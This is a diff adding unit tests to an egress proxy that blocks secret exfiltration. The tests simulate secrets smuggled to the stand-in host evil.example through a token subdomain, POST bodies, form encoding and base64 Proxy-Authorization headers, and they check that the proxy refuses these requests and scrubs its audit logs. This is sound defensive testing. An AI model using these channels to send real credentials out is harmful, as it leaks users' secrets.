@@ -2752,12 +2752,18 @@ class RequestSecretTests(unittest.TestCase):
 
     def test_secret_in_token_subdomain_killed(self):
         # A secret smuggled in the target authority leaks at DNS time.
+        # The request()-hook scan is the backstop (the pre-connect
+        # refusal lives in server_connect); the audit/warning must
+        # still never carry the raw host — it IS the secret.
         a, flow = self._flow(host=SECRETS["github"] + ".evil.example")
         a.request(flow)
         self.assertIsNotNone(flow.error)
-        self.assertIn((SECRETS["github"] + ".evil.example",
+        self.assertIn(("hsurr:github.evil.example",
                        "request-secret-refused",
                        "real-value:hsurr:github"), a.audit_notes)
+        for h, act, reason in a.audit_notes:
+            self.assertNotIn(SECRETS["github"], h)
+            self.assertNotIn(SECRETS["github"], reason)
 
     def test_secret_in_header_killed(self):
         a, flow = self._flow(
@@ -2865,6 +2871,123 @@ class RequestSecretTests(unittest.TestCase):
             a.request(flow)
         self.assertIsNotNone(flow.error)
         self.assertIn(("evil.example", "request-secret-refused",
+                       "check-error"), a.audit_notes)
+
+    def test_check_error_scrubs_authority_host(self):
+        # When the triples were obtained before the detection error,
+        # the audit host is scrubbed (the raw host may BE the secret);
+        # only a _secret_replacements failure falls back to the raw
+        # host, mirroring the pre-existing #94 check-error precedent.
+        a, flow = self._flow(host=SECRETS["github"] + ".evil.example",
+                             path="/cb?x=1")
+        with mock.patch.object(a, "_request_secret_names",
+                               side_effect=RuntimeError("boom")):
+            a.request(flow)
+        self.assertIsNotNone(flow.error)
+        self.assertIn(("hsurr:github.evil.example",
+                       "request-secret-refused", "check-error"),
+                      a.audit_notes)
+        for h, act, reason in a.audit_notes:
+            self.assertNotIn(SECRETS["github"], h)
+
+    def test_secret_in_body_killed(self):
+        # A manually crafted POST body carrying a real secret is the
+        # most probable exfil channel — it must not pass the gate.
+        a, flow = self._flow(
+            path="/collect",
+            headers=(("Content-Type", "application/json"),),
+            content=b'{"token": "' + SECRETS["github"].encode() + b'"}')
+        a.request(flow)
+        self.assertIsNotNone(flow.error)
+        self.assertIn(("evil.example", "request-secret-refused",
+                       "real-value:hsurr:github"), a.audit_notes)
+
+    def test_form_encoded_secret_in_body_killed(self):
+        # Form bodies get the same decode stages as the query string.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        a, flow = self._flow(
+            path="/collect",
+            headers=(("Content-Type",
+                      "application/x-www-form-urlencoded"),),
+            content=("token=" + enc).encode())
+        a.request(flow)
+        self.assertIsNotNone(flow.error)
+        self.assertIn(("evil.example", "request-secret-refused",
+                       "real-value:hsurr:pw"), a.audit_notes)
+
+    def test_over_cap_body_passes_with_audit(self):
+        # Finding 71: an attacker-sized body must not become a parsing
+        # DoS on the shared proxy — it passes through unscanned, and
+        # the pass is audited like the allowlisted swap path's.
+        big = b"x" * (sa._MAX_SWAP_BODY_BYTES + 1)
+        a, flow = self._flow(path="/upload", content=big)
+        a.request(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn(("evil.example", "request-body", "over-scan-cap"),
+                      a.audit_notes)
+
+    def test_binary_body_passes_silently(self):
+        # A non-UTF-8 body cannot be text-scanned: a stated residual,
+        # mirroring the allowlisted path's binary-body pass-through.
+        a, flow = self._flow(path="/upload",
+                             content=b"\xff\xfe\x00binary")
+        a.request(flow)
+        self.assertIsNone(flow.error)
+        self.assertEqual(a.audit_notes, [])
+
+    def test_proxy_authorization_basic_decoded_killed(self):
+        # Proxy-Authorization: Basic is forwarded upstream when the
+        # proxy itself doesn't consume proxy-auth — the decoded form
+        # is a live base64 exfil channel, same as Authorization.
+        creds = base64.b64encode(
+            ("user:" + SECRETS["github"]).encode()).decode()
+        a, flow = self._flow(
+            headers=(("Proxy-Authorization", "Basic " + creds),))
+        a.request(flow)
+        self.assertIsNotNone(flow.error)
+        self.assertIn(("evil.example", "request-secret-refused",
+                       "real-value:hsurr:github"), a.audit_notes)
+
+    def test_server_connect_authority_secret_refused_pre_dns(self):
+        # Architecture B1: the authority scan runs in server_connect
+        # BEFORE _resolve_ips — refusing here prevents the DNS
+        # resolution (and TLS SNI) of a token-subdomain from ever
+        # leaving the box. The request()-hook scan stays the backstop.
+        a = make_addon()
+        secret_host = SECRETS["github"] + ".evil.example"
+        data = FakeServerConnectData(secret_host)
+        asyncio.run(a.server_connect(data))
+        self.assertEqual(data.server.error,
+                         "swap-proxy: egress refused (authority-secret)")
+        self.assertEqual(data.server.address, (secret_host, 443))  # unpinned
+        self.assertIn(("hsurr:github.evil.example",
+                       "authority-secret-refused",
+                       "real-value:hsurr:github"), a.audit_notes)
+        for h, act, reason in a.audit_notes:
+            self.assertNotIn(SECRETS["github"], h)
+            self.assertNotIn(SECRETS["github"], reason)
+
+    def test_server_connect_benign_host_proceeds(self):
+        # A host with no secret sighting reaches the normal egress
+        # guard unchanged: resolved, pinned, no error, no audit.
+        a = make_addon(hosts=["evil.example"])
+        a._dns_cache["evil.example"] = (time.time() + 3600,
+                                         ["93.184.216.34"])
+        data = FakeServerConnectData("evil.example")
+        asyncio.run(a.server_connect(data))
+        self.assertIsNone(data.server.error)
+        self.assertEqual(data.server.address, ("93.184.216.34", 443))
+        self.assertEqual(a.audit_notes, [])
+
+    def test_server_connect_check_error_fails_closed(self):
+        a = make_addon()
+        data = FakeServerConnectData("evil.example")
+        with mock.patch.object(a, "_secret_replacements",
+                               side_effect=RuntimeError("boom")):
+            asyncio.run(a.server_connect(data))
+        self.assertEqual(data.server.error,
+                         "swap-proxy: egress refused (authority-secret)")
+        self.assertIn(("evil.example", "authority-secret-refused",
                        "check-error"), a.audit_notes)
 
     def test_multiple_credentials_all_named(self):
